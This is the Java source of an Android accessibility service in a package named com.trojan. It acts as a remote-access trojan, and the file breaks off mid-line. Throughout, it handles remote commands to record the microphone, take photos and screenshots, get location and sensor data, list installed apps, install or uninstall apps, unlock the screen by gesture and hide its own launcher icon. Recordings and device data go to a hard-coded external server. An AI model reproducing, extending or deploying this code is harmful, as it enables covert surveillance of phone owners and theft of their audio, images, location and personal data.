// FILE: app/src/main/java/com/trojan/PowerAccessibilityService.java

package com.trojan;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Path;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.File;
import java.io.IOException;
import java.util.List;

public class PowerAccessibilityService extends AccessibilityService implements SensorEventListener {
    private static final String TAG = "PowerAccessibility";
    public static final String ACTION_TRIGGER_LOCK_SCREEN = "com.trojan.ACTION_LOCK_SCREEN";
    public static final String ACTION_TRIGGER_SHUTDOWN = "com.trojan.ACTION_SHUTDOWN";
    public static final String ACTION_TRIGGER_LIST_APPS = "com.trojan.ACTION_LIST_APPS";
    public static final String ACTION_TRIGGER_GET_CURRENT_APP = "com.trojan.ACTION_GET_CURRENT_APP";
    public static final String ACTION_TRIGGER_OPEN_APP = "com.trojan.ACTION_OPEN_APP";
    public static final String ACTION_TRIGGER_NAV_BACK = "com.trojan.ACTION_NAV_BACK";
    public static final String ACTION_TRIGGER_NAV_HOME = "com.trojan.ACTION_NAV_HOME";
    public static final String ACTION_TRIGGER_NAV_RECENTS = "com.trojan.ACTION_NAV_RECENTS";
    public static final String ACTION_TRIGGER_WAKE_DEVICE = "com.trojan.ACTION_WAKE_DEVICE";
    public static final String ACTION_TRIGGER_TOGGLE_WIFI = "com.trojan.ACTION_TOGGLE_WIFI";
    public static final String ACTION_TRIGGER_TOGGLE_BLUETOOTH = "com.trojan.ACTION_TOGGLE_BLUETOOTH";
    public static final String ACTION_TRIGGER_TOGGLE_LOCATION = "com.trojan.ACTION_TOGGLE_LOCATION";
    public static final String ACTION_TRIGGER_GET_LOCATION = "com.trojan.ACTION_GET_LOCATION";
    public static final String ACTION_TRIGGER_GET_SENSORS = "com.trojan.ACTION_GET_SENSORS";
    public static final String ACTION_TRIGGER_GET_SCREEN_STATUS = "com.trojan.ACTION_GET_SCREEN_STATUS";
    public static final String ACTION_TRIGGER_GET_BATTERY_STATUS = "com.trojan.ACTION_GET_BATTERY_STATUS";
    public static final String ACTION_TAKE_SCREENSHOT = "com.trojan.ACTION_TAKE_SCREENSHOT";
    public static final String ACTION_TAKE_PICTURE = "com.trojan.ACTION_TAKE_PICTURE";
    public static final String ACTION_START_RECORDING = "com.trojan.ACTION_START_RECORDING";
    public static final String ACTION_STOP_RECORDING = "com.trojan.ACTION_STOP_RECORDING";
    public static final String ACTION_PLAY_SOUND = "com.trojan.ACTION_PLAY_SOUND";
    public static final String ACTION_SHOW_IMAGE = "com.trojan.ACTION_SHOW_IMAGE";
    public static final String ACTION_SET_VOLUME = "com.trojan.ACTION_SET_VOLUME";
    public static final String ACTION_INSTALL_APP = "com.trojan.ACTION_INSTALL_APP";
    public static final String ACTION_UNINSTALL_APP = "com.trojan.ACTION_UNINSTALL_APP";
    public static final String ACTION_TOGGLE_APP_ICON = "com.trojan.ACTION_TOGGLE_APP_ICON";
    private static final String SUBMIT_DATA_URL = "https://trojanadmin.netlify.app/.netlify/functions/submit-data";
    private PowerActionReceiver powerActionReceiver;
    private RequestQueue requestQueue;
    private String lastForegroundAppPkg = "N/A";
    private FusedLocationProviderClient fusedLocationClient;
    private SensorManager sensorManager;
    private AudioManager audioManager;
    private MediaRecorder mediaRecorder;
    private String recordingFilePath;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.i(TAG, "Accessibility Service Connected.");
        requestQueue = Volley.newRequestQueue(this);
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        powerActionReceiver = new PowerActionReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(ACTION_TRIGGER_LOCK_SCREEN); filter.addAction(ACTION_TRIGGER_SHUTDOWN);
        filter.addAction(ACTION_TRIGGER_LIST_APPS); filter.addAction(ACTION_TRIGGER_GET_CURRENT_APP);
        filter.addAction(ACTION_TRIGGER_OPEN_APP); filter.addAction(ACTION_TRIGGER_NAV_BACK);
        filter.addAction(ACTION_TRIGGER_NAV_HOME); filter.addAction(ACTION_TRIGGER_NAV_RECENTS);
        filter.addAction(ACTION_TRIGGER_WAKE_DEVICE); filter.addAction(ACTION_TRIGGER_TOGGLE_WIFI);
        filter.addAction(ACTION_TRIGGER_TOGGLE_BLUETOOTH); filter.addAction(ACTION_TRIGGER_TOGGLE_LOCATION);
        filter.addAction(ACTION_TRIGGER_GET_LOCATION); filter.addAction(ACTION_TRIGGER_GET_SENSORS);
        filter.addAction(ACTION_TRIGGER_GET_SCREEN_STATUS); filter.addAction(ACTION_TRIGGER_GET_BATTERY_STATUS);
        filter.addAction(ACTION_TAKE_SCREENSHOT); filter.addAction(ACTION_TAKE_PICTURE);
        filter.addAction(ACTION_START_RECORDING); filter.addAction(ACTION_STOP_RECORDING);
        filter.addAction(ACTION_PLAY_SOUND); filter.addAction(ACTION_SHOW_IMAGE);
        filter.addAction(ACTION_SET_VOLUME); filter.addAction(ACTION_INSTALL_APP);
        filter.addAction(ACTION_UNINSTALL_APP); filter.addAction(ACTION_TOGGLE_APP_ICON);
        registerReceiver(powerActionReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
    }

    private class PowerActionReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = (intent == null) ? null : intent.getAction();
            if (action == null) return;
            Log.i(TAG, "Command received: " + action);
            switch (action) {
                case ACTION_TRIGGER_LOCK_SCREEN: performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN); break;
                case ACTION_TRIGGER_SHUTDOWN: performGlobalAction(GLOBAL_ACTION_POWER_DIALOG); break;
                case ACTION_TRIGGER_NAV_BACK: performGlobalAction(GLOBAL_ACTION_BACK); break;
                case ACTION_TRIGGER_NAV_HOME: performGlobalAction(GLOBAL_ACTION_HOME); break;
                case ACTION_TRIGGER_NAV_RECENTS: performGlobalAction(GLOBAL_ACTION_RECENTS); break;
                case ACTION_TRIGGER_LIST_APPS: getAndUploadAppList(); break;
                case ACTION_TRIGGER_GET_CURRENT_APP: submitDataToServer("current_app", lastForegroundAppPkg); break;
                case ACTION_TRIGGER_OPEN_APP: openApp(intent.getStringExtra("package_name")); break;
                case ACTION_TRIGGER_WAKE_DEVICE: wakeUpAndSwipe(); break;
                case ACTION_TRIGGER_GET_SCREEN_STATUS: getScreenStatus(); break;
                case ACTION_TRIGGER_GET_BATTERY_STATUS: getBatteryStatus(); break;
                case ACTION_TRIGGER_TOGGLE_WIFI: openSettingsPanel(Settings.Panel.ACTION_WIFI); break;
                case ACTION_TRIGGER_TOGGLE_BLUETOOTH: openSettingsPanel(Settings.ACTION_BLUETOOTH_SETTINGS); break;
                case ACTION_TRIGGER_TOGGLE_LOCATION: openSettingsPanel(Settings.ACTION_LOCATION_SOURCE_SETTINGS); break;
                case ACTION_TRIGGER_GET_LOCATION: getCurrentLocation(); break;
                case ACTION_TRIGGER_GET_SENSORS: getSensorData(); break;
                case ACTION_TAKE_SCREENSHOT:
                    Log.i(TAG, "Triggering ScreenshotActivity to handle screen capture.");
                    Intent screenshotIntent = new Intent(context, ScreenshotActivity.class);
                    screenshotIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(screenshotIntent);
                    break;
                case ACTION_TAKE_PICTURE: takePicture(intent.getIntExtra("camera_id", 0)); break;
                case ACTION_START_RECORDING: startAudioRecording(); break;
                case ACTION_STOP_RECORDING: stopAudioRecording(); break;
                case ACTION_PLAY_SOUND: playSound(intent.getStringExtra("url")); break;
                case ACTION_SHOW_IMAGE: showImage(intent.getStringExtra("url")); break;
                case ACTION_SET_VOLUME: setVolume(intent.getIntExtra("level", -1)); break;
                case ACTION_INSTALL_APP: installApp(intent.getStringExtra("url")); break;
                case ACTION_UNINSTALL_APP: uninstallApp(intent.getStringExtra("package_name")); break;
                case ACTION_TOGGLE_APP_ICON: toggleAppIcon(intent.getBooleanExtra("show", false)); break;
            }
        }
    }

    @SuppressLint("WakelockTimeout")
    private void wakeUpAndSwipe() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null) {
            PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "trojan::WakeLock");
            wakeLock.acquire(5000L);
        }
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
            Path swipePath = new Path();
            swipePath.moveTo(displayMetrics.widthPixels / 2f, displayMetrics.heightPixels * 0.8f);
            swipePath.lineTo(displayMetrics.widthPixels / 2f, displayMetrics.heightPixels * 0.2f);
            dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 400)).build(), null, null);
        }, 500);
    }
    private void takePicture(int cameraId) {
        Intent intent = new Intent(this, CameraActivity.class);
        intent.putExtra("camera_id", cameraId);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    private void startAudioRecording() {
        if(mediaRecorder!=null){return;}
        try {
            File outputDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
            File outputFile = File.createTempFile("recording", ".mp3", outputDir);
            recordingFilePath = outputFile.getAbsolutePath();
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setOutputFile(recordingFilePath);
            mediaRecorder.prepare();
            mediaRecorder.start();
        } catch (IOException e) {mediaRecorder = null;}
    }
    private void stopAudioRecording() {
        if(mediaRecorder==null){return;}
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder=null;
            File audioFile = new File(recordingFilePath);
            if (audioFile.exists()) {
                try {
                    java.io.InputStream inputStream = new java.io.FileInputStream(audioFile);
                    byte[] audioBytes = new byte[(int) audioFile.length()];
                    inputStream.read(audioBytes);
                    inputStream.close();
                    uploadBase64File("last_recording", Base64.encodeToString(audioBytes, Base64.DEFAULT));
                    audioFile.delete();
                } catch (Exception e) {}
            }
        } catch (RuntimeException e) {mediaRecorder = null;}
    }
    private void uploadBase64File(String dataType, String base64Data) {
        String url="https://trojanadmin.netlify.app/.netlify/functions/upload-file";
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            postData.put("dataType", dataType);
            postData.put("fileData", base64Data);
            requestQueue.add(new JsonObjectRequest(Request.Method.POST, url, postData, r -> {}, e -> {}));
        } catch (JSONException e) {}
    }
    private void playSound(String url) {
        if(url==null||url.isEmpty())return;
        MediaPlayer mediaPlayer=new MediaPlayer();
        try {
            mediaPlayer.setDataSource(url);
            mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            mediaPlayer.prepareAsync();
            mediaPlayer.setOnPreparedListener(MediaPlayer::start);
            mediaPlayer.setOnCompletionListener(mp -> {mp.stop(); mp.release();});
        } catch (IOException e) {}
    }
    private void showImage(String url) {
        if(url==null||url.isEmpty())return;
        Intent intent=new Intent(this, ImageDisplayActivity.class);
        intent.putExtra("image_url", url);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    private void setVolume(int level) {
        if(level<0||level>100||audioManager==null)return;
        int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, (int)(maxVolume*(level/100.0f)), 0);
    }
    private void installApp(String url) {
        if(url==null||url.isEmpty())return;
        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    }
    private void uninstallApp(String packageName) {
        if(packageName==null||packageName.isEmpty())return;
        startActivity(new Intent(Intent.ACTION_DELETE, Uri.parse("package:"+packageName)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    }
    private void toggleAppIcon(boolean show) {
        getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class), show?PackageManager.COMPONENT_ENABLED_STATE_ENABLED:PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
    private void getAndUploadAppList() {
        try {
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            JSONObject appMap = new JSONObject();
            for (ApplicationInfo app : apps) {
                if ((app.flags & ApplicationInf
